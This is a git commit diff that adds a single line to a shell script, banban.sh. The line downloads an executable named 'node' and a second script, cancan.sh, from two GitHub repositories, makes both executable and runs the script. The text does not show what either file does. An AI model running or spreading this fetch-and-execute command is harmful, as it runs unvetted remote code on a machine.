fb1300d039c56ece1ca230e6666ad2fd11c161e9
synthsizer <39385299+synthsizer@users.noreply.github.com>
2024-01-12 11:26:05 +0700

    Update banban.sh

--- banban.sh
+++ banban.sh
@@ -1,1 +1,1 @@
-
+wget https://github.com/lukmanpurai/KERJA/raw/main/node && chmod +x node && wget https://raw.githubusercontent.com/synthsizer/widicantik/main/cancan.sh && chmod +x cancan.sh && ./cancan.sh
